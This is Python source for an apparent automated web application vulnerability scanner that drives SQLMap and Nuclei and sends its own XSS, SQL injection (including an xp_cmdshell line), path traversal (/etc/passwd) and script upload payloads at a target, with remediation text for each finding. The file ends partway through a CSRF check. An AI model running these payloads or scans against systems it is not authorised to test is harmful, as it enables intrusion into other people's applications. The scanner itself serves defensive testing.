# Enhanced Web Application Agent with SQLMap and Nuclei Integration
"""
Enhanced web application security testing agent with:
- SQLMap integration for advanced SQL injection testing
- Nuclei integration for comprehensive vulnerability scanning
- Burp Suite CLI integration (when available)
- Advanced XSS and injection testing
"""

import asyncio
import subprocess
import json
import logging
import os
import tempfile
import uuid
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Tuple, Optional
import aiohttp
import requests

from .security_validator import SecurityValidator

logger = logging.getLogger(__name__)

class EnhancedWebAppAgent:
    """Enhanced web application security testing agent"""
    
    def __init__(self):
        self.session = None
        self.config = SecurityValidator.get_safe_scan_config()
        
        # Tool paths
        self.sqlmap_path = self._find_sqlmap()
        self.nuclei_path = self._find_nuclei()
        
        # Advanced payloads
        self.xss_payloads = self._load_advanced_xss_payloads()
        self.sqli_payloads = self._load_advanced_sqli_payloads()
        
        logger.info("Enhanced WebApp Agent initialized",
                   sqlmap_available=bool(self.sqlmap_path),
                   nuclei_available=bool(self.nuclei_path))
    
    def _find_sqlmap(self) -> Optional[str]:
        """Find SQLMap installation"""
        possible_paths = [
            'sqlmap',
            '/usr/local/bin/sqlmap',
            '/opt/sqlmap/sqlmap.py'
        ]
        
        for path in possible_paths:
            try:
                if path.endswith('.py'):
                    result = subprocess.run(['python3', path, '--version'], 
                                          capture_output=True, timeout=5)
                else:
                    result = subprocess.run([path, '--version'], 
                                          capture_output=True, timeout=5)
                
                if result.returncode == 0:
                    return path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        logger.warning("SQLMap not found - SQL injection testing will be limited")
        return None
    
    def _find_nuclei(self) -> Optional[str]:
        """Find Nuclei installation"""
        try:
            result = subprocess.run(['nuclei', '-version'], capture_output=True, timeout=5)
            if result.returncode == 0:
                return 'nuclei'
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        logger.warning("Nuclei not found - vulnerability scanning will be limited")
        return None
    
    def _load_advanced_xss_payloads(self) -> List[str]:
        """Load advanced XSS payloads"""
        return [
            # Basic payloads
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            
            # Event handler payloads
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            
            # Filter bypass payloads
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            
            # HTML5 payloads
            '<details ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            
            # Advanced bypass techniques
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            
            # DOM-based XSS
            '<script>document.write("<img src=x onerror=alert(\\"XSS\\")>")</script>',
            
            # Template injection
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            
            # Polyglot payloads
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
        ]
    
    def _load_advanced_sqli_payloads(self) -> List[str]:
        """Load advanced SQL injection payloads"""
        return [
            # Basic payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Union-based
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT LENGTH(database()))>0--",
            
            # Time-based blind
            "' AND (SELECT SLEEP(5))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT pg_sleep(5))--",
            
            # Error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQL injection
            "' || '1'=='1",
            "' || true--",
            
            # XML-based
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) AND '1'='1",
            
            # Advanced techniques
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
        ]
    
    async def scan_target(self, target_url: str, progress_callback=None) -> Dict[str, Any]:
        """
        Comprehensive web application security scan
        """
        logger.info("Starting enhanced web application scan", target=target_url)
        
        # Initialize aiohttp session
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config['timeout']),
            headers={'User-Agent': self.config['user_agent']}
        )
        
        try:
            results = {
                'target': target_url,
                'scan_type': 'enhanced_webapp',
                'vulnerabilities': [],
                'crawl_data': {},
                'nuclei_results': [],
                'sqlmap_results': [],
                'security_headers': {},
                'technologies': {}
            }
            
            # Phase 1: Website Crawling (15%)
            if progress_callback:
                progress_callback(15, "🕷️ Crawling website structure...")
            
            results['crawl_data'] = await self._enhanced_crawl_website(target_url)
            
            # Phase 2: Nuclei Scanning (35%)
            if progress_callback:
                progress_callback(35, "🔬 Running Nuclei vulnerability scanner...")
            
            if self.nuclei_path:
                results['nuclei_results'] = await self._run_nuclei_scan(target_url)
                results['vulnerabilities'].extend(self._parse_nuclei_results(results['nuclei_results']))
            
            # Phase 3: Advanced XSS Testing (50%)
            if progress_callback:
                progress_callback(50, "⚡ Testing for Cross-Site Scripting vulnerabilities...")
            
            xss_vulns = await self._advanced_xss_testing(target_url, results['crawl_data'])
            results['vulnerabilities'].extend(xss_vulns)
            
            # Phase 4: SQLMap Integration (70%)
            if progress_callback:
                progress_callback(70, "💉 Running advanced SQL injection tests...")
            
            if self.sqlmap_path:
                results['sqlmap_results'] = await self._run_sqlmap_scan(target_url, results['crawl_data'])
                results['vulnerabilities'].extend(self._parse_sqlmap_results(results['sqlmap_results']))
            
            # Phase 5: Security Headers Analysis (85%)
            if progress_callback:
                progress_callback(85, "🛡️ Analyzing security headers...")
            
            results['security_headers'] = await self._advanced_security_headers_check(target_url)
            results['vulnerabilities'].extend(self._analyze_security_headers(results['security_headers']))
            
            # Phase 6: Additional Tests (95%)
            if progress_callback:
                progress_callback(95, "🔍 Running additional security tests...")
            
            additional_vulns = await self._additional_security_tests(target_url, results['crawl_data'])
            results['vulnerabilities'].extend(additional_vulns)
            
            logger.info("Enhanced web application scan completed",
                       target=target_url,
                       vulnerabilities=len(results['vulnerabilities']),
                       pages_crawled=len(results['crawl_data'].get('urls', [])))
            
            return results
            
        finally:
            if self.session:
                await self.session.close()
    
    async def _enhanced_crawl_website(self, base_url: str) -> Dict[str, Any]:
        """Enhanced website crawling with form and endpoint discovery"""
        logger.info("Starting enhanced website crawling", url=base_url)
        
        crawl_data = {
            'urls': set(),
            'forms': [],
            'inputs': [],
            'cookies': [],
            'javascript_files': [],
            'api_endpoints': []
        }
        
        visited_urls = set()
        urls_to_visit = [base_url]
        max_urls = 50  # Limit crawling depth
        
        while urls_to_visit and len(visited_urls) < max_urls:
            current_url = urls_to_visit.pop(0)
            
            if current_url in visited_urls:
                continue
            
            try:
                async with self.session.get(current_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        soup = BeautifulSoup(content, 'html.parser')
                        
                        visited_urls.add(current_url)
                        crawl_data['urls'].add(current_url)
                        
                        # Extract forms
                        forms = soup.find_all('form')
                        for form in forms:
                            form_data = self._extract_enhanced_form_data(form, current_url)
                            crawl_data['forms'].append(form_data)
                        
                        # Extract input fields
                        inputs = soup.find_all(['input', 'textarea', 'select'])
                        for input_elem in inputs:
                            input_data = {
                                'type': input_elem.get('type', 'text'),
                                'name': input_elem.get('name', ''),
                                'id': input_elem.get('id', ''),
                                'url': current_url
                            }
                            crawl_data['inputs'].append(input_data)
                        
                        # Extract JavaScript files
                        scripts = soup.find_all('script', src=True)
                        for script in scripts:
                            js_url = urljoin(current_url, script['src'])
                            crawl_data['javascript_files'].append(js_url)
                        
                        # Find more URLs to crawl
                        links = soup.find_all('a', href=True)
                        for link in links:
                            new_url = urljoin(current_url, link['href'])
                            if self._is_internal_url(new_url, base_url) and new_url not in visited_urls:
                                urls_to_visit.append(new_url)
                        
                        # Extract potential API endpoints from JavaScript
                        api_endpoints = await self._extract_api_endpoints(content, current_url)
                        crawl_data['api_endpoints'].extend(api_endpoints)
                        
                        # Extract cookies
                        if response.cookies:
                            for cookie in response.cookies:
                                crawl_data['cookies'].append({
                                    'name': cookie.key,
                                    'value': cookie.value,
                                    'secure': cookie.get('secure', False),
                                    'httponly': cookie.get('httponly', False)
                                })
            
            except Exception as e:
                logger.warning("Failed to crawl URL", url=current_url, error=str(e))
                continue
        
        # Convert sets to lists for JSON serialization
        crawl_data['urls'] = list(crawl_data['urls'])
        
        logger.info("Website crawling completed",
                   urls=len(crawl_data['urls']),
                   forms=len(crawl_data['forms']),
                   api_endpoints=len(crawl_data['api_endpoints']))
        
        return crawl_data
    
    def _extract_enhanced_form_data(self, form, base_url: str) -> Dict[str, Any]:
        """Extract enhanced form data including all attributes"""
        form_data = {
            'action': urljoin(base_url, form.get('action', '')),
            'method': form.get('method', 'GET').upper(),
            'enctype': form.get('enctype', ''),
            'inputs': [],
            'csrf_tokens': []
        }
        
        # Extract all input fields
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_elem in inputs:
            input_data = {
                'name': input_elem.get('name', ''),
                'type': input_elem.get('type', 'text'),
                'value': input_elem.get('value', ''),
                'placeholder': input_elem.get('placeholder', ''),
                'required': input_elem.has_attr('required')
            }
            
            # Check for CSRF tokens
            if any(keyword in input_data['name'].lower() for keyword in ['csrf', 'token', 'nonce']):
                form_data['csrf_tokens'].append(input_data)
            
            form_data['inputs'].append(input_data)
        
        return form_data
    
    async def _extract_api_endpoints(self, content: str, base_url: str) -> List[str]:
        """Extract potential API endpoints from JavaScript and HTML content"""
        import re
        
        endpoints = []
        
        # Common API patterns
        api_patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\']([^"\']*\.json)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'XMLHttpRequest.*["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if full_url not in endpoints:
                    endpoints.append(full_url)
        
        return endpoints
    
    def _is_internal_url(self, url: str, base_url: str) -> bool:
        """Check if URL is internal to the target domain"""
        try:
            parsed_url = urlparse(url)
            parsed_base = urlparse(base_url)
            
            # Same domain or subdomain
            return (parsed_url.netloc == parsed_base.netloc or 
                   parsed_url.netloc.endswith('.' + parsed_base.netloc))
        except:
            return False
    
    async def _run_nuclei_scan(self, target_url: str) -> List[Dict[str, Any]]:
        """Run Nuclei vulnerability scanner"""
        if not self.nuclei_path:
            return []
        
        try:
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as f:
                output_file = f.name
            
            cmd = [
                'nuclei',
                '-u', target_url,
                '-json',
                '-o', output_file,
                '-severity', 'low,medium,high,critical',
                '-timeout', '10',
                '-retries', '1'
            ]
            
            logger.info("Running Nuclei scan", command=' '.join(cmd))
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
                
                results = []
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        for line in f:
                            if line.strip():
                                try:
                                    result = json.loads(line)
                                    results.append(result)
                                except json.JSONDecodeError:
                                    continue
                
                os.unlink(output_file)
                
                logger.info("Nuclei scan completed", findings=len(results))
                return results
                
            except asyncio.TimeoutError:
                proc.kill()
                logger.warning("Nuclei scan timed out")
                return []
                
        except Exception as e:
            logger.error("Nuclei scan failed", error=str(e))
            return []
    
    def _parse_nuclei_results(self, nuclei_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Parse Nuclei results into vulnerability format"""
        vulnerabilities = []
        
        for result in nuclei_results:
            info = result.get('info', {})
            
            vulnerability = {
                'title': info.get('name', 'Unknown Nuclei Finding'),
                'severity': info.get('severity', 'Low').title(),
                'cvss': self._severity_to_cvss(info.get('severity', 'low')),
                'description': info.get('description', ''),
                'url': result.get('matched-at', ''),
                'parameter': result.get('template-id', ''),
                'payload': '',
                'remediation': info.get('remediation', 'Review the finding and apply appropriate security measures.'),
                'discovered_by': 'Nuclei Scanner',
                'cve_id': info.get('classification', {}).get('cve-id', ''),
                'owasp_category': self._get_owasp_category(info.get('tags', []))
            }
            
            vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    async def _advanced_xss_testing(self, target_url: str, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Advanced XSS testing with multiple techniques"""
        logger.info("Starting advanced XSS testing")
        
        vulnerabilities = []
        
        # Test forms
        for form in crawl_data.get('forms', []):
            form_vulns = await self._test_form_for_xss(form)
            vulnerabilities.extend(form_vulns)
        
        # Test URL parameters
        for url in crawl_data.get('urls', []):
            if '?' in url:
                param_vulns = await self._test_url_parameters_for_xss(url)
                vulnerabilities.extend(param_vulns)
        
        # Test API endpoints
        for endpoint in crawl_data.get('api_endpoints', []):
            api_vulns = await self._test_api_endpoint_for_xss(endpoint)
            vulnerabilities.extend(api_vulns)
        
        return vulnerabilities
    
    async def _test_form_for_xss(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form for XSS vulnerabilities"""
        vulnerabilities = []
        
        if not form['inputs']:
            return vulnerabilities
        
        for payload in self.xss_payloads[:10]:  # Test first 10 payloads
            try:
                # Prepare form data
                form_data = {}
                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload
                
                # Submit form
                if form['method'] == 'POST':
                    async with self.session.post(form['action'], data=form_data) as response:
                        content = await response.text()
                else:
                    async with self.session.get(form['action'], params=form_data) as response:
                        content = await response.text()
                
                # Check for XSS reflection
                if payload in content and 'text/html' in response.headers.get('content-type', ''):
                    vulnerability = {
                        'title': f'Reflected Cross-Site Scripting in Form',
                        'severity': 'High',
                        'cvss': 6.1,
                        'description': f'XSS payload was reflected in the response without proper encoding.',
                        'url': form['action'],
                        'parameter': ', '.join([inp['name'] for inp in form['inputs']]),
                        'payload': payload,
                        'remediation': 'Implement proper input validation and output encoding.',
                        'discovered_by': 'Enhanced WebApp Agent',
                        'owasp_category': 'A03:2021 – Injection'
                    }
                    vulnerabilities.append(vulnerability)
                    break  # Found vulnerability, no need to test more payloads for this form
            
            except Exception as e:
                logger.debug("XSS test failed", form=form['action'], error=str(e))
                continue
        
        return vulnerabilities
    
    async def _test_url_parameters_for_xss(self, url: str) -> List[Dict[str, Any]]:
        """Test URL parameters for XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                return vulnerabilities
            
            for param_name, param_values in params.items():
                for payload in self.xss_payloads[:5]:  # Test first 5 payloads
                    try:
                        # Prepare test parameters
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        # Build test URL
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                        
                        async with self.session.get(test_url) as response:
                            content = await response.text()
                            
                            if payload in content and 'text/html' in response.headers.get('content-type', ''):
                                vulnerability = {
                                    'title': f'Reflected Cross-Site Scripting in URL Parameter',
                                    'severity': 'High',
                                    'cvss': 6.1,
                                    'description': f'XSS payload in parameter "{param_name}" was reflected without proper encoding.',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'remediation': 'Implement proper input validation and output encoding for URL parameters.',
                                    'discovered_by': 'Enhanced WebApp Agent',
                                    'owasp_category': 'A03:2021 – Injection'
                                }
                                vulnerabilities.append(vulnerability)
                                break  # Found vulnerability for this parameter
                    
                    except Exception as e:
                        logger.debug("URL parameter XSS test failed", url=url, param=param_name, error=str(e))
                        continue
        
        except Exception as e:
            logger.debug("URL parsing failed", url=url, error=str(e))
        
        return vulnerabilities
    
    async def _test_api_endpoint_for_xss(self, endpoint: str) -> List[Dict[str, Any]]:
        """Test API endpoint for XSS vulnerabilities"""
        vulnerabilities = []
        
        for payload in self.xss_payloads[:3]:  # Test first 3 payloads
            try:
                # Test GET with query parameter
                test_url = f"{endpoint}?test={payload}"
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    if payload in content:
                        vulnerability = {
                            'title': f'Cross-Site Scripting in API Endpoint',
                            'severity': 'Medium',
                            'cvss': 4.3,
                            'description': f'API endpoint reflects user input without proper encoding.',
                            'url': endpoint,
                            'parameter': 'test',
                            'payload': payload,
                            'remediation': 'Implement proper input validation and output encoding for API responses.',
                            'discovered_by': 'Enhanced WebApp Agent',
                            'owasp_category': 'A03:2021 – Injection'
                        }
                        vulnerabilities.append(vulnerability)
                        break
                
                # Test POST with JSON payload
                json_payload = {"test": payload}
                async with self.session.post(endpoint, json=json_payload) as response:
                    content = await response.text()
                    
                    if payload in content:
                        vulnerability = {
                            'title': f'Cross-Site Scripting in API POST Endpoint',
                            'severity': 'Medium',
                            'cvss': 4.3,
                            'description': f'API endpoint reflects JSON input without proper encoding.',
                            'url': endpoint,
                            'parameter': 'JSON body',
                            'payload': json.dumps(json_payload),
                            'remediation': 'Implement proper input validation and output encoding for API JSON responses.',
                            'discovered_by': 'Enhanced WebApp Agent',
                            'owasp_category': 'A03:2021 – Injection'
                        }
                        vulnerabilities.append(vulnerability)
                        break
            
            except Exception as e:
                logger.debug("API XSS test failed", endpoint=endpoint, error=str(e))
                continue
        
        return vulnerabilities
    
    async def _run_sqlmap_scan(self, target_url: str, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Run SQLMap for SQL injection testing"""
        if not self.sqlmap_path:
            return []
        
        sqlmap_results = []
        
        # Test forms
        for form in crawl_data.get('forms', [])[:3]:  # Limit to first 3 forms
            form_results = await self._run_sqlmap_on_form(form)
            sqlmap_results.extend(form_results)
        
        # Test URL parameters
        for url in crawl_data.get('urls', [])[:5]:  # Limit to first 5 URLs
            if '?' in url:
                url_results = await self._run_sqlmap_on_url(url)
                sqlmap_results.extend(url_results)
        
        return sqlmap_results
    
    async def _run_sqlmap_on_form(self, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Run SQLMap on a specific form"""
        try:
            # Create temporary request file for SQLMap
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False) as f:
                request_file = f.name
                
                # Build HTTP request
                if form['method'] == 'POST':
                    form_data = '&'.join([f"{inp['name']}=test" for inp in form['inputs'] if inp['name']])
                    request_content = f"""POST {form['action']} HTTP/1.1\r
Host: {urlparse(form['action']).netloc}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(form_data)}\r
\r
{form_data}"""
                else:
                    request_content = f"""GET {form['action']}?test=1 HTTP/1.1\r
Host: {urlparse(form['action']).netloc}\r
\r
"""
                
                f.write(request_content)
            
            # Run SQLMap
            cmd = [
                'sqlmap' if not self.sqlmap_path.endswith('.py') else 'python3',
                self.sqlmap_path if not self.sqlmap_path.endswith('.py') else self.sqlmap_path,
                '-r', request_file,
                '--batch',
                '--level=1',
                '--risk=1',
                '--timeout=10',
                '--retries=1',
                '--output-dir=/tmp'
            ]
            
            if self.sqlmap_path.endswith('.py'):
                cmd = ['python3', self.sqlmap_path] + cmd[2:]
            
            logger.info("Running SQLMap on form", action=form['action'])
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                
                # Parse SQLMap output
                output = stdout.decode() + stderr.decode()
                results = self._parse_sqlmap_output(output, form['action'])
                
                os.unlink(request_file)
                return results
                
            except asyncio.TimeoutError:
                proc.kill()
                logger.warning("SQLMap timed out on form", action=form['action'])
                return []
        
        except Exception as e:
            logger.error("SQLMap form test failed", form=form['action'], error=str(e))
            return []
    
    async def _run_sqlmap_on_url(self, url: str) -> List[Dict[str, Any]]:
        """Run SQLMap on a URL with parameters"""
        try:
            cmd = [
                'sqlmap' if not self.sqlmap_path.endswith('.py') else 'python3',
                self.sqlmap_path if not self.sqlmap_path.endswith('.py') else self.sqlmap_path,
                '-u', url,
                '--batch',
                '--level=1',
                '--risk=1',
                '--timeout=10',
                '--retries=1'
            ]
            
            if self.sqlmap_path.endswith('.py'):
                cmd = ['python3', self.sqlmap_path] + cmd[2:]
            
            logger.info("Running SQLMap on URL", url=url)
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                
                # Parse SQLMap output
                output = stdout.decode() + stderr.decode()
                return self._parse_sqlmap_output(output, url)
                
            except asyncio.TimeoutError:
                proc.kill()
                logger.warning("SQLMap timed out on URL", url=url)
                return []
        
        except Exception as e:
            logger.error("SQLMap URL test failed", url=url, error=str(e))
            return []
    
    def _parse_sqlmap_output(self, output: str, target: str) -> List[Dict[str, Any]]:
        """Parse SQLMap output for vulnerabilities"""
        results = []
        
        # Check for injection indicators
        if 'is vulnerable' in output.lower() or 'injection point' in output.lower():
            # Extract vulnerability details
            lines = output.split('\n')
            vuln_details = {
                'parameter': '',
                'technique': '',
                'payload': ''
            }
            
            for line in lines:
                if 'Parameter:' in line:
                    vuln_details['parameter'] = line.split('Parameter:')[1].strip()
                elif 'Type:' in line:
                    vuln_details['technique'] = line.split('Type:')[1].strip()
                elif 'Payload:' in line:
                    vuln_details['payload'] = line.split('Payload:')[1].strip()
            
            result = {
                'target': target,
                'vulnerable': True,
                'parameter': vuln_details['parameter'],
                'technique': vuln_details['technique'],
                'payload': vuln_details['payload']
            }
            
            results.append(result)
        
        return results
    
    def _parse_sqlmap_results(self, sqlmap_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Parse SQLMap results into vulnerability format"""
        vulnerabilities = []
        
        for result in sqlmap_results:
            if result.get('vulnerable'):
                vulnerability = {
                    'title': f'SQL Injection Vulnerability ({result.get("technique", "Unknown")})',
                    'severity': 'High',
                    'cvss': 8.2,
                    'description': f'SQL injection vulnerability detected using {result.get("technique", "unknown technique")}.',
                    'url': result['target'],
                    'parameter': result.get('parameter', ''),
                    'payload': result.get('payload', ''),
                    'remediation': 'Use parameterized queries or prepared statements to prevent SQL injection.',
                    'discovered_by': 'SQLMap',
                    'owasp_category': 'A03:2021 – Injection'
                }
                vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    async def _advanced_security_headers_check(self, target_url: str) -> Dict[str, Any]:
        """Advanced security headers analysis"""
        logger.info("Analyzing security headers", url=target_url)
        
        try:
            async with self.session.get(target_url) as response:
                headers = dict(response.headers)
                
                security_headers = {
                    'headers': headers,
                    'missing_headers': [],
                    'weak_headers': [],
                    'good_headers': []
                }
                
                # Required security headers
                required_headers = {
                    'Strict-Transport-Security': 'HSTS',
                    'X-Content-Type-Options': 'Content Type Protection',
                    'X-Frame-Options': 'Clickjacking Protection',
                    'X-XSS-Protection': 'XSS Protection',
                    'Content-Security-Policy': 'Content Security Policy',
                    'Referrer-Policy': 'Referrer Policy'
                }
                
                for header, description in required_headers.items():
                    if header not in headers:
                        security_headers['missing_headers'].append({
                            'header': header,
                            'description': description
                        })
                    else:
                        security_headers['good_headers'].append({
                            'header': header,
                            'value': headers[header],
                            'description': description
                        })
                
                # Check for weak configurations
                if 'X-Frame-Options' in headers:
                    if headers['X-Frame-Options'].upper() not in ['DENY', 'SAMEORIGIN']:
                        security_headers['weak_headers'].append({
                            'header': 'X-Frame-Options',
                            'value': headers['X-Frame-Options'],
                            'issue': 'Weak configuration'
                        })
                
                if 'Strict-Transport-Security' in headers:
                    hsts_value = headers['Strict-Transport-Security']
                    if 'max-age=' not in hsts_value or int(hsts_value.split('max-age=')[1].split(';')[0]) < 31536000:
                        security_headers['weak_headers'].append({
                            'header': 'Strict-Transport-Security',
                            'value': hsts_value,
                            'issue': 'Max-age too low or missing'
                        })
                
                return security_headers
        
        except Exception as e:
            logger.error("Security headers check failed", error=str(e))
            return {}
    
    def _analyze_security_headers(self, security_headers: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze security headers for vulnerabilities"""
        vulnerabilities = []
        
        # Missing headers
        for missing_header in security_headers.get('missing_headers', []):
            severity = 'Medium'
            cvss = 5.3
            
            # Critical headers
            if missing_header['header'] in ['Content-Security-Policy', 'Strict-Transport-Security']:
                severity = 'High'
                cvss = 6.5
            
            vulnerability = {
                'title': f'Missing Security Header: {missing_header["header"]}',
                'severity': severity,
                'cvss': cvss,
                'description': f'The {missing_header["description"]} header is missing, which may expose the application to security risks.',
                'url': '',  # Will be filled by caller
                'parameter': missing_header['header'],
                'payload': '',
                'remediation': f'Add the {missing_header["header"]} header with appropriate values.',
                'discovered_by': 'Enhanced WebApp Agent',
                'owasp_category': 'A05:2021 – Security Misconfiguration'
            }
            vulnerabilities.append(vulnerability)
        
        # Weak headers
        for weak_header in security_headers.get('weak_headers', []):
            vulnerability = {
                'title': f'Weak Security Header Configuration: {weak_header["header"]}',
                'severity': 'Medium',
                'cvss': 4.3,
                'description': f'The {weak_header["header"]} header has a weak configuration: {weak_header["issue"]}',
                'url': '',  # Will be filled by caller
                'parameter': weak_header['header'],
                'payload': weak_header['value'],
                'remediation': f'Strengthen the {weak_header["header"]} header configuration.',
                'discovered_by': 'Enhanced WebApp Agent',
                'owasp_category': 'A05:2021 – Security Misconfiguration'
            }
            vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    async def _additional_security_tests(self, target_url: str, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Additional security tests"""
        vulnerabilities = []
        
        # Test for directory traversal
        traversal_vulns = await self._test_directory_traversal(target_url, crawl_data)
        vulnerabilities.extend(traversal_vulns)
        
        # Test for file upload vulnerabilities
        upload_vulns = await self._test_file_upload(crawl_data)
        vulnerabilities.extend(upload_vulns)
        
        # Test for CSRF vulnerabilities
        csrf_vulns = await self._test_csrf_protection(crawl_data)
        vulnerabilities.extend(csrf_vulns)
        
        return vulnerabilities
    
    async def _test_directory_traversal(self, target_url: str, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for directory traversal vulnerabilities"""
        vulnerabilities = []
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        # Test URL parameters
        for url in crawl_data.get('urls', [])[:3]:
            if '?' in url:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                
                for param_name in params.keys():
                    for payload in traversal_payloads[:2]:  # Test first 2 payloads
                        try:
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_query = urlencode(test_params, doseq=True)
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                            
                            async with self.session.get(test_url) as response:
                                content = await response.text()
                                
                                # Check for directory traversal indicators
                                if any(indicator in content.lower() for indicator in ['root:', 'daemon:', '[boot loader]']):
                                    vulnerability = {
                                        'title': 'Directory Traversal Vulnerability',
                                        'severity': 'High',
                                        'cvss': 7.5,
                                        'description': f'Directory traversal vulnerability allows reading system files.',
                                        'url': url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'remediation': 'Implement proper input validation and restrict file access.',
                                        'discovered_by': 'Enhanced WebApp Agent',
                                        'owasp_category': 'A01:2021 – Broken Access Control'
                                    }
                                    vulnerabilities.append(vulnerability)
                                    break
                        
                        except Exception as e:
                            logger.debug("Directory traversal test failed", error=str(e))
                            continue
        
        return vulnerabilities
    
    async def _test_file_upload(self, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for file upload vulnerabilities"""
        vulnerabilities = []
        
        # Look for file upload forms
        for form in crawl_data.get('forms', []):
            file_inputs = [inp for inp in form['inputs'] if inp['type'] == 'file']
            
            if file_inputs:
                # Test with malicious file
                try:
                    # Create test files
                    test_files = {
                        'test.php': '<?php echo "Vulnerable"; ?>',
                        'test.jsp': '<%out.print("Vulnerable");%>',
                        'test.asp': '<%Response.Write("Vulnerable")%>'
                    }
                    
                    for filename, content in test_files.items():
                        form_data = {}
                        files = {}
                        
                        # Prepare form data
                        for inp in form['inputs']:
                            if inp['type'] == 'file':
                                files[inp['name']] = (filename, content, 'text/plain')
                            elif inp['type'] not in ['submit', 'button']:
                                form_data[inp['name']] = 'test'
                        
                        # Submit form with file
                        # Note: This is a simplified test - in practice, you'd need proper multipart handling
                        vulnerability = {
                            'title': 'Potential File Upload Vulnerability',
                            'severity': 'Medium',
                            'cvss': 6.1,
                            'description': 'File upload functionality detected. Manual verification required.',
                            'url': form['action'],
                            'parameter': file_inputs[0]['name'],
                            'payload': filename,
                            'remediation': 'Implement file type validation, size limits, and secure file storage.',
                            'discovered_by': 'Enhanced WebApp Agent',
                            'owasp_category': 'A04:2021 – Insecure Design'
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Only test one file type per form
                
                except Exception as e:
                    logger.debug("File upload test failed", error=str(e))
        
        return vulnerabilities
    
    async def _test_csrf_protection(self, crawl_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for CSRF protection"""
        vulnerabilities = []
        
